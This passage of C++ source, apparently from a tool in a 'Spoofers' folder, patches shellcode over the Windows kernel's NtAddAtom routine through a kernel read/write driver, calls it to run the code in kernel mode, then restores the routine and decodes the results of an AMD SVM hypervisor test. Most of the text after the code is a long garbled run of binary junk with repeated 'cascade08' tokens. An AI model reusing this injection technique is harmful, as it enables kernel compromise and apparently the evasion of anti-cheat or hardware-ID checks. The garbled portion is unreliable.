  *(uint32_t *)&patched[OFF_HSAVE_LOW] = (uint32_t)(hsavePa & 0xFFFFFFFF);
  *(uint32_t *)&patched[OFF_HSAVE_HIGH] =
      (uint32_t)((hsavePa >> 32) & 0xFFFFFFFF);
  *(uint64_t *)&patched[OFF_VMCB_VA] = vmcbVa;
  *(uint64_t *)&patched[OFF_VMCB_PA] = vmcbPa;
  *(uint64_t *)&patched[OFF_GUEST_STACK] = guestStackTop; // CRITICAL FIX!

  int32_t leaDisp = (int32_t)(guestCodeOffset - (OFF_LEA_DISP + 4));
  *(int32_t *)&patched[OFF_LEA_DISP] = leaDisp;

  printf("[+] LEA displacement: %d\n", leaDisp);
  printf("[+] Shellcode patched (%zu bytes)\n\n", sizeof(patched));

  printf("Press ENTER to execute V6.4 FIXED...\n");
  getchar();

  uint8_t backup[700];
  ReadMemory(kernelNtAddAtom, backup, sizeof(patched));
  WriteToReadOnlyMemory(kernelNtAddAtom, patched, sizeof(patched));

  printf("[*] Executing V6.4 FIXED...\n");
  HMODULE ntdll = GetModuleHandleA("ntdll.dll");
  auto NtAddAtomFunc = (NTSTATUS(__stdcall *)(
      void *, ULONG, PUSHORT))GetProcAddress(ntdll, "NtAddAtom");
  USHORT atom = 0;
  NTSTATUS result = NtAddAtomFunc(nullptr, 0, &atom);

  WriteToReadOnlyMemory(kernelNtAddAtom, backup, sizeof(patched));
  printf("[+] NtAddAtom restored\n\n");

  // Decode result
  uint32_t ret = (uint32_t)result;
  uint32_t cpuidCount = ret & 0xFFFF;
  uint32_t termCode = (ret >> 16) & 0xFF;
  uint32_t exitReason = (ret >> 24) & 0xFF;

  printf("=== V6.4 Results ===\n");
  printf("[*] Raw return: 0x%08X\n", ret);
  printf("[*] CPUID count: %d\n", cpuidCount);
  printf("[*] Term code: %d", termCode);
  if (termCode == 1)
    printf(" (HLT - clean!)");
  else if (termCode == 2)
    printf(" (WATCHDOG)");
  else if (termCode == 4)
    printf(" (UNKNOWN)");
  printf("\n");
  printf("[*] Exit reason: 0x%X", exitReason);
  if (exitReason == 0x72)
    printf(" (CPUID)");
  else if (exitReason == 0x78)
    printf(" (HLT)");
  printf("\n");

  // V6.4 return format: (exit_reason << 24) | cpuid_count
  // Note: termCode is NOT set in shellcode, so it's always 0
  // cpuidCount should be 3 (3 CPUID iterations before HLT)
  // exitReason should be 0x78 for HLT
  if (cpuidCount == 3 && exitReason == 0x78) {
    printf("\n");
    printf("=============================================\n");
    printf("  [+] SUCCESS! V6.4 HLT TERMINATION WORKS!  \n");
    printf("  [+] 3 CPUIDs + HLT clean exit (0x78)      \n");
    printf("  [+] Phase 1 SVM Complete!                 \n");
    printf("=============================================\n");
  } else if (cpuidCount >= 1) {
    printf("\n[+] Partial success: %d CPUIDs handled, exit=0x%X\n", cpuidCount,
           exitReason);
  } else {
    printf("\n[!] Check results\n");
  }

  CloseHandle(hDevice);
  return 0;
}
ªU *cascade08ªU­U*cascade08­U´U *cascade08´U·U*cascade08·U¹U *cascade08¹U»U*cascade08»UÁU *cascade08ÁUÚU*cascade08ÚUía *cascade08íaÕb*cascade08ÕbŒc *cascade08Œc£c*cascade08£c¹c *cascade08¹cÎc*cascade08Îcúc *cascade08úc‰d*cascade08‰dªd *cascade08ªdÔe*cascade08Ôe¡f *cascade08¡f¹f*cascade08¹fìo *cascade08ìoÅq*cascade08Åq¼y*cascade08¼yİ| *cascade08İ|ç| *cascade08ç|è|è|ï| *cascade08ï|ğ|ğ|ñ| *cascade08ñ|ó|ó|õ| *cascade08õ|ù|ù|ú| *cascade08ú|ş|ş|ÿ| *cascade08ÿ|‡}‡}ˆ} *cascade08ˆ}‰}‰}Š} *cascade08Š}}}} *cascade08}•}•}—} *cascade08—}Ÿ}*cascade08Ÿ} } *cascade08 }¢}*cascade08¢}¤} *cascade08¤}§}*cascade08§}¨} *cascade08¨}©}©}ª} *cascade08ª}¬}¬}¯} *cascade08¯}°} *cascade08°}±} *cascade08±}³}³}´} *cascade08´}¶}¶}·} *cascade08·}¼}*cascade08¼}½} *cascade08½}Á}Á}Â} *cascade08Â}Æ}Æ}Ç} *cascade08Ç}È}È}É} *cascade08É}Ê}Ê}Ë} *cascade08Ë}Ì} *cascade08Ì}Î}Î}Ï} *cascade08Ï}Ö}Ö}Ü} *cascade08Ü}Á~ *cascade08Á~Â~ *cascade08Â~Ã~Ã~Ê~*cascade08Ê~Ë~ *cascade08Ë~Ì~Ì~Ñ~ *cascade08Ñ~Ô~Ô~Õ~ *cascade08
Õ~×~ ×~Ø~ *cascade08Ø~Ú~Ú~Û~ *cascade08Û~ã~ã~ä~ *cascade08
ä~í~ í~î~*cascade08î~Ç *cascade08Çí*cascade08íø *cascade08ø‚‚*cascade08‚‚‚ *cascade08‚ì‚*cascade08ì‚¹ƒ *cascade08¹ƒÑƒ*cascade08ÑƒÚƒ *cascade08
Úƒêƒêƒíƒ *cascade08íƒîƒ *cascade08
îƒûƒûƒüƒ *cascade08
üƒ¡„¡„£„ *cascade08£„¤„ *cascade08
¤„§„§„¨„ *cascade08¨„­„*cascade08­„¯„ *cascade08¯„°„*cascade08°„±„ *cascade08
±„²„²„³„ *cascade08
³„µ„µ„¶„ *cascade08
¶„·„·„¸„ *cascade08
¸„¿„¿„À„ *cascade08
À„Í„Í„Î„ *cascade08
Î„Ğ„Ğ„Ò„ *cascade08
Ò„Õ„Õ„×„ *cascade08
×„Û„Û„Ü„ *cascade08
Ü„İ„İ„ã„ *cascade08ã„ğ„ *cascade08
ğ„ñ„ñ„ò„ *cascade08
ò„¿…¿…È… *cascade08
È…É…É…Ê… *cascade08Ê…Ø… *cascade08
Ø…Ù…Ù…Û… *cascade08
Û…İ…İ…â… *cascade08
â…ò…ò…¿† *cascade08
¿†×†×†ä† *cascade08ä†ö†*cascade08ö†…‡*cascade08…‡İ‡ *cascade08İ‡ß‡ *cascade08ß‡î‡ *cascade08î‡€ˆ *cascade08€ˆ„ˆ*cascade08„ˆ…ˆ …ˆ†ˆ*cascade08†ˆ‰ˆ ‰ˆŠˆ *cascade08Šˆˆ*cascade08ˆ‘ˆ ‘ˆ“ˆ*cascade08“ˆ”ˆ *cascade08”ˆ•ˆ *cascade08•ˆœˆ*cascade08œˆˆ*cascade08ˆ¥ˆ *cascade08¥ˆéˆ*cascade08éˆíˆ *cascade08
íˆôˆôˆõˆ *cascade08õˆöˆ *cascade08
öˆ÷ˆ÷ˆøˆ *cascade08
øˆúˆúˆûˆ *cascade08
ûˆÿˆÿˆ€‰ *cascade08€‰‰ *cascade08‰ƒ‰ *cascade08
ƒ‰£‰£‰¤‰ *cascade08
¤‰©‰©‰«‰ *cascade08«‰±‰ *cascade08
±‰²‰²‰¼‰ *cascade08¼‰½‰ ½‰¾‰*cascade08¾‰Õ‰ Õ‰Ö‰ *cascade08
Ö‰×‰×‰Ø‰ *cascade08Ø‰Ü‰ Ü‰İ‰*cascade08İ‰ì‰ ì‰î‰*cascade08î‰ï‰ ï‰ğ‰*cascade08ğ‰ñ‰ ñ‰ú‰ *cascade08
ú‰û‰û‰…Š *cascade08
…Š†Š†Š‰Š *cascade08‰ŠŠ *cascade08
Š˜Š˜Š™Š *cascade08
™Š›Š›ŠœŠ*cascade08œŠŸŠ *cascade08ŸŠ§Š *cascade08§Š¨Š*cascade08¨Š­Š *cascade08
­Š®Š®Š¯Š *cascade08
¯Š´Š´Š¿Š *cascade08¿ŠÁŠ *cascade08ÁŠÈŠ *cascade08
ÈŠÉŠÉŠÌŠ *cascade08ÌŠÌŠ*cascade08ÌŠÓŠ *cascade08ÓŠÔŠ*cascade08ÔŠÕŠ *cascade08
ÕŠàŠàŠäŠ *cascade08
äŠóŠóŠõŠ *cascade08
õŠöŠöŠ÷Š *cascade08
÷ŠúŠúŠûŠ *cascade08
ûŠüŠüŠıŠ *cascade08
ıŠ€‹€‹„‹ *cascade08
„‹ˆ‹ˆ‹‰‹ *cascade08
‰‹Ñ‹Ñ‹Ò‹ *cascade08Ò‹Ó‹ *cascade08Ó‹Õ‹ *cascade08
Õ‹à‹à‹á‹ *cascade08á‹â‹ *cascade08
â‹ã‹ã‹å‹ *cascade08
å‹í‹í‹î‹ *cascade08
î‹‰Œ‰Œ§Œ *cascade08
§Œ¨Œ¨Œ²Œ *cascade08
²Œ¾Œ¾ŒÉŒ *cascade08
ÉŒÊŒÊŒìŒ *cascade08
ìŒ‚‚† *cascade08
†­­® *cascade08
®··¸ *cascade08
¸¾¾ó *cascade08óó*cascade08ó¹‘ *cascade08¹‘½‘*cascade08½‘À‘ *cascade08À‘Æ’*cascade08Æ’Í’ *cascade08Í’Î’*cascade08Î’×’ *cascade08×’Ù’*cascade08Ù’â’ *cascade08â’ä’*cascade08ä’é’ *cascade08é’ê’*cascade08ê’ë’ *cascade08ë’í’*cascade08í’î’ *cascade08î’ñ’*cascade08ñ’ô’ *cascade08ô’›“*cascade08›“œ“ *cascade08œ“±“*cascade08±“²“ *cascade08²“¼“*cascade08¼“½“ *cascade08½“À“*cascade08À“Á“ *cascade08Á“Æ“*cascade08Æ“Ç“ *cascade08Ç“ğ“*cascade08ğ“ñ“ *cascade08ñ“ı“*cascade08ı“ş“ *cascade08ş“†”*cascade08†”‡” *cascade08‡””*cascade08”” *cascade08”¯”*cascade08¯”°” *cascade08°”±” *cascade08
±”´”´”µ” *cascade08
µ”¸”¸”¹” *cascade08
¹”º”º”¼” *cascade08¼”½” *cascade08
½”¾”¾”¿” *cascade08
¿”Ú”Ú”Ü” *cascade08Ü”İ” *cascade08İ”æ”*cascade08æ”è” *cascade08è”´•*cascade08´•µ• *cascade08µ•Ò•*cascade08Ò•Ô• *cascade08Ô•Û•*cascade08Û•Ü• *cascade08Ü•Ş•*cascade08Ş•ç• *cascade08ç•é•*cascade08é•ò• *cascade08ò•¬–*cascade08¬–·– *cascade08·–¹–*cascade08¹–Â– *cascade08Â–Ğ–*cascade08Ğ–Ñ– *cascade08Ñ–è–*cascade08è–é– *cascade08é–ó–*cascade08ó–ô– *cascade08ô–ö–*cascade08ö–÷– *cascade08÷–ú–*cascade08ú–û– *cascade08û–Ä—*cascade08Ä—Å— *cascade08Å—Ù—*cascade08Ù—Û— *cascade08Û—è—*cascade08è—ê— *cascade08ê—ñ—*cascade08ñ—ò— *cascade08ò—¾˜*cascade08¾˜¿˜ *cascade08¿˜‚™*cascade08‚™ƒ™ *cascade08ƒ™ğ™*cascade08ğ™€š *cascade08€šÖ›*cascade08Ö›‚œ *cascade08‚œˆœ*cascade08ˆœ‰œ *cascade08‰œŠœ*cascade08Šœ‹œ *cascade08‹œ–œ*cascade08–œ—œ *cascade08—œ™œ *cascade08™œœœ *cascade08œœœ*cascade08œŸœ *cascade08Ÿœüœ*cascade08üœıœ *cascade08ıœ´*cascade08´µ *cascade08µ· *cascade08·º *cascade08
º½½Á *cascade08
ÁÃÃœŸ *cascade08œŸŸ *cascade08ŸáŸ*cascade08áŸâŸ*cascade08âŸåŸ*cascade08åŸæŸ *cascade08æŸ€ *cascade08€   *cascade08 ‚ *cascade08‚ ƒ  *cascade08ƒ „ *cascade08„ …  *cascade08… ¨ *cascade08¨ ª  *cascade08ª Ş *cascade08Ş ß  *cascade08ß è¢*cascade08è¢é¢ *cascade08é¢ì¢*cascade08ì¢í¢ *cascade08í¢ƒ£ *cascade08ƒ£Ù¤*cascade08Ù¤ª¥ *cascade08ª¥¦ *cascade08¦¦ *cascade08¦¦*cascade08¦¦§ *cascade08¦§Ç§ *cascade08Ç§È§ *cascade08
È§Ë§Ë§Ì§ *cascade08Ì§Ï§*cascade08
Ï§Ñ§Ñ§Ú§ *cascade08Ú§Ş§*cascade08Ş§ß§ *cascade08ß§à§*cascade08à§á§ *cascade08á§â§*cascade08â§ä§ *cascade08ä§å§*cascade08å§æ§ *cascade08æ§ç§*cascade08ç§è§ *cascade08è§ë§*cascade08ë§ô§ *cascade08ô§õ§*cascade08õ§ş§ *cascade08ş§€¨*cascade08€¨‰¨ *cascade08‰¨‹¨*cascade08‹¨¨ *cascade08¨“¨*cascade08“¨–¨ *cascade08–¨—¨*cascade08—¨¡¨ *cascade08¡¨¢¨*cascade08¢¨§¨ *cascade08§¨°¨*cascade08°¨¸¨ *cascade08¸¨º¨*cascade08º¨Ã¨ *cascade08Ã¨Ä¨*cascade08Ä¨Î¨ *cascade08Î¨Ğ¨*cascade08Ğ¨Ù¨ *cascade08Ù¨Û¨*cascade08Û¨ç¨ *cascade08ç¨õ¨*cascade08õ¨ı¨ *cascade08ı¨ÿ¨*cascade08ÿ¨ˆ© *cascade08ˆ©Š©*cascade08Š©© *cascade08©”©*cascade08”©•© *cascade08•©–©*cascade08–©˜© *cascade08˜©š©*cascade08š©£© *cascade08£©¥©*cascade08¥©®© *cascade08®©°©*cascade08°©µ© *cascade08µ©¶©*cascade08¶©·© *cascade08·©¸©*cascade08¸©¹© *cascade08¹©º©*cascade08º©Â© *cascade08Â©Ä©*cascade08Ä©Í© *cascade08Í©Ï©*cascade08Ï©Ø© *cascade08Ø©å©*cascade08å©ê© *cascade08ê©ï©*cascade08ï©ğ© *cascade08ğ©ò©*cascade08ò©ó© *cascade08ó©ô©*cascade08ô©õ© *cascade08õ©÷© *cascade08÷©†ª †ªŠª*cascade08Šª‹ª *cascade08‹ª’ª*cascade08’ª“ª *cascade08“ªÃª*cascade08ÃªÄª *cascade08ÄªÅª*cascade08ÅªÆª *cascade08Æª¹¬ *cascade08¹¬®*cascade08®Ü® *cascade08Ü®İ®*cascade08İ®æ®*cascade08æ®ç® *cascade08ç®ë®*cascade08ë®ì® *cascade08ì®õ®*cascade08õ®ö® *cascade08ö®‘¯*cascade08‘¯’¯ *cascade08’¯“¯*cascade08“¯”¯ *cascade08”¯¯*cascade08¯Ÿ¯ *cascade08Ÿ¯ ¯ *cascade08 ¯¡¯ *cascade08¡¯±¯ *cascade08±¯ñ¯*cascade08ñ¯¾° *cascade08¾°¿°*cascade08¿°Á°*cascade08Á°Â° Â°Ç°*cascade08Ç°È° *cascade08È°Ó° *cascade08Ó°à°*cascade08à°á° *cascade08á°ò°*cascade08ò°ó° *cascade08ó°–±*cascade08–±À± *cascade08À±Á± *cascade08Á±„²*cascade08„²…² *cascade08…²Š²*cascade08Š²‹² *cascade08‹²å² *cascade08å²å²*cascade08å²Š³ *cascade08
Š³”³”³¤³ *cascade08¤³¥³ *cascade08¥³«³*cascade08«³±³ *cascade08
±³æ³æ³é³ *cascade08
é³ê³ê³ó³ *cascade08
ó³ş³ş³ÿ³ *cascade08
ÿ³€´€´‰´ *cascade08
‰´Š´Š´˜´ *cascade08˜´›´ *cascade08›´´ *cascade08
´ ´ ´¡´ *cascade08
¡´¨´¨´µ´ *cascade08
µ´ˆµˆµŒ¶ *cascade08Œ¶¶*cascade08¶œ¶ *cascade08œ¶¶*cascade08¶î¶ *cascade08î¶Â¸ *cascade08Â¸Â¸*cascade08Â¸†¹ *cascade08†¹‡¹ *cascade08‡¹ˆ¹*cascade08ˆ¹¹ *cascade08¹¹*cascade08¹¹ *cascade08¹‘¹*cascade08‘¹’¹ ’¹•¹*cascade08•¹—¹ *cascade08—¹¼¹ *cascade08¼¹Ã¹*cascade08Ã¹Ä¹ *cascade08Ä¹Å¹*cascade08Å¹Æ¹ *cascade08Æ¹Ù¹*cascade08Ù¹Ú¹ *cascade08Ú¹â¹*cascade08â¹ã¹ *cascade08ã¹ç¹*cascade08ç¹è¹ *cascade08è¹ğ¹*cascade08ğ¹ó¹ *cascade08ó¹ô¹*cascade08ô¹õ¹ *cascade08õ¹‚º*cascade08‚º„º *cascade08„º®º*cascade08®ºÌº *cascade08ÌºÍº*cascade08ÍºÚº *cascade08ÚºÜº*cascade08Üºáº áºâº*cascade08âºòº*cascade08òº÷» *cascade08÷»û»*cascade08û»ı» *cascade08ı»‚¼*cascade08‚¼„¼ *cascade08„¼Š¼*cascade08Š¼Œ¼ *cascade08Œ¼¼*cascade08¼¼ *cascade08¼‘¼*cascade08‘¼’¼ *cascade08’¼—¼*cascade08—¼˜¼ *cascade08˜¼›¼*cascade08›¼µ¼ *cascade08µ¼¶¼*cascade08¶¼·¼ *cascade08·¼Ã¼*cascade08Ã¼Ä¼ *cascade08Ä¼È¼*cascade08È¼É¼ *cascade08É¼Ê¼*cascade08Ê¼…½ *cascade08…½Š½*cascade08Š½Œ½ *cascade08Œ½½*cascade08½‘½ *cascade08‘½’½*cascade08’½“½ *cascade08“½•½*cascade08•½–½ *cascade08–½™½*cascade08™½š½ *cascade08š½½*cascade08½½ *cascade08½ ½*cascade08 ½¡½ *cascade08¡½¢½*cascade08¢½£½ *cascade08£½­½*cascade08­½®½ *cascade08®½¶½*cascade08¶½Õ½ *cascade08Õ½Ú½*cascade08Ú½Ü½ *cascade08Ü½ß½*cascade08ß½à½ *cascade08à½ì½*cascade08ì½í½ *cascade08í½õ½*cascade08õ½ÙÁ *cascade08
ÙÁøÁøÁ·Ç *cascade08
·ÇÁÊÁÊÊÍ *cascade08
ÊÍ‘Î‘ÎªÎ *cascade08
ªÎ¯Î¯Î°Î *cascade08
°Î²Î²Î³Î *cascade08
³ÎµÎµÎµÓ *cascade08µÓ¶Ó*cascade08¶ÓçÓ *cascade08çÓÿÓ*cascade08ÿÓÆÕ *cascade08ÆÕ Ö*cascade08 Ö–Ø *cascade08–ØÑØ*cascade08ÑØÀÙ *cascade08ÀÙŒÚ*cascade08ŒÚ‘İ *cascade08
‘İ“İ“İ”İ *cascade08
”İšİšİœİ *cascade08
œİŸİŸİ İ*cascade08 İ¡İ*cascade08¡İ£İ *cascade08£İ¤İ *cascade08¤İ¥İ *cascade08¥İ¦İ*cascade08
¦İ·İ·İ¸İ *cascade08
¸İ¹İ¹İºİ *cascade08
ºİ»İ»İ¼İ *cascade08
¼İ½İ½İ¾İ *cascade08
¾İÈİÈİÉİ *cascade08
ÉİËİËİÌİ *cascade08
ÌİÍİÍİÎİ *cascade08
ÎİÔİÔİÕİ *cascade08
ÕİÙİÙİßİ *cascade08ßİê *cascade08
êêê‘ê *cascade08
‘ê—ê—ê™ê *cascade08
™ê®ê®ê³ê *cascade08
³êµêµê¹ê *cascade08
¹ê»ê»ê½ê *cascade08
½ê¿ê¿êÀê *cascade08
ÀêÅêÅêÏê *cascade08
Ïêğëğëóë *cascade08
óëôëôë‚í *cascade08
‚í‡í‡íˆí *cascade08
ˆí‘í‘í³í *cascade08
³í´í´íÂí *cascade08
ÂíÄíÄíÈí *cascade08
ÈíÌíÌíÍí *cascade08
ÍíÓíÓíòí *cascade08
òíöíöíøí *cascade08
øíùíùíúí *cascade08
úíÿíÿí‡î *cascade08
‡îŒîŒîúî *cascade08
úîûîûî´ï *cascade08
´ï¿ï¿ïÎï *cascade08
ÎïæïæïÌğ *cascade0820file:///C:/inject/Spoofers/SVMHypervisorV6_4.cpp